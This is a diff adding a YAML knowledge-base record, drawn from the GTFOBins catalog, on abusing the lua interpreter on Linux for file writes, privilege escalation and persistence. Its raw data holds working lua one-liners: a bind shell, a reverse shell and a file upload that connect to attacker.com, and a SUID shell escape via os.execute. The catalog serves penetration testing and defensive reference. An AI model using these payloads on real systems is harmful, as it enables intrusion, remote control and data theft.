@@ -1,0 +1,132 @@
+id: gtfobins/lua/file-write/suid
+type: binary
+platform: linux
+name: lua
+phases:
+- persistence
+- privilege-escalation
+capabilities:
+- file-write
+privilege_required: suid
+sources:
+- project: GTFOBins
+  upstream_url: https://gtfobins.github.io
+  license: GPL-3.0
+  upstream_version: acd524623f9c406acedd2754ebd9c2431f3675ad
+  last_synced: '2026-11-13'
+commands:
+- template: lua -e 'local f=io.open("/path/to/output-file", "wb"); f:write("DATA"); io.close(f);'
+references:
+- https://gtfobins.github.io/gtfobins/lua/
+tags:
+- linux
+- unix
+- gtfobins
+source_data:
+  GTFOBins:
+    raw:
+      documents:
+        lua:
+          functions:
+            bind-shell:
+            - code: "lua -e '\n  local k=require(\"socket\");\n  local s=assert(k.bind(\"*\",12345));\n\
+                \  local c=s:accept();\n  while true do\n    local r,x=c:receive();local f=assert(io.popen(r,\"\
+                r\"));\n    local b=assert(f:read(\"*a\"));c:send(b);\n  end;c:close();f:close();'"
+              comment: This requires `lua-socket` to be available.
+              connector: tcp-client
+              contexts:
+                sudo: null
+                suid:
+                  shell: true
+                unprivileged: null
+            download:
+            - code: "lua -e '\n  local k=require(\"socket\");\n  local s=assert(k.bind(\"*\",12345));\n\
+                \  local c=s:accept();\n  local d,x=c:receive(\"*a\");\n  c:close();\n  local f=io.open(\"\
+                /path/to/output-file\", \"wb\");\n  f:write(d);\n  io.close(f);'"
+              comment: This requires `lua-socket` to be available.
+              contexts:
+                sudo: null
+                suid: null
+                unprivileged: null
+              sender: tcp-client
+            file-read:
+            - code: lua -e 'local f=io.open("/path/to/input-file", "rb"); io.write(f:read("*a")); io.close(f);'
+              contexts:
+                sudo: null
+                suid: null
+                unprivileged: null
+            file-write:
+            - code: lua -e 'local f=io.open("/path/to/output-file", "wb"); f:write("DATA"); io.close(f);'
+              contexts:
+                sudo: null
+                suid: null
+                unprivileged: null
+            reverse-shell:
+            - code: "lua -e '\n  local s=require(\"socket\");\n  local t=assert(s.tcp());\n  t:connect(\"\
+                attacker.com\",12345);\n  while true do\n    local r,x=t:receive();local f=assert(io.popen(r,\"\
+                r\"));\n    local b=assert(f:read(\"*a\"));t:send(b);\n  end;\n  f:close();t:close();'"
+              comment: This requires `lua-socket` to be available.
+              contexts:
+                sudo: null
+                suid:
+                  shell: true
+                unprivileged: null
+              listener: tcp-server
+            shell:
+            - code: lua -e 'os.execute("/bin/sh")'
+              contexts:
+                sudo: null
+                suid:
+                  shell: true
+                unprivileged: null
+            upload:
+            - code: "lua -e '\n  local f=io.open(\"/path/to/input-file\", \"rb\")\n  local d=f:read(\"\
+                *a\")\n  io.close(f);\n  local s=require(\"socket\");\n  local t=assert(s.tcp());\n  t:connect(\"\
+                attacker.com\",12345);\n  t:send(d);\n  t:close();'"
+              comment: This requires `lua-socket` to be available.
+              contexts:
+                sudo: null
+                suid: null
+                unprivileged: null
+              receiver: tcp-server
+    upstream_url: https://gtfobins.github.io/gtfobins/lua/
+    upstream_version: acd524623f9c406acedd2754ebd9c2431f3675ad
+    last_synced: '2026-11-13'
+enrichment:
+  capabilities:
+  - value: file-write
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+  phases:
+  - value: persistence
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+  - value: privilege-escalation
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+  privilege_required:
+    value: suid
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+_meta:
+  schema_version: 1
+  generated_by: loldex-projection
+  projected_at: '2026-11-13'
+  source_hashes:
+    GTFOBins: sha256:f1170eaf6eda655bd463c1ee812c96387b6335b083606b678ca40f8058916b3f
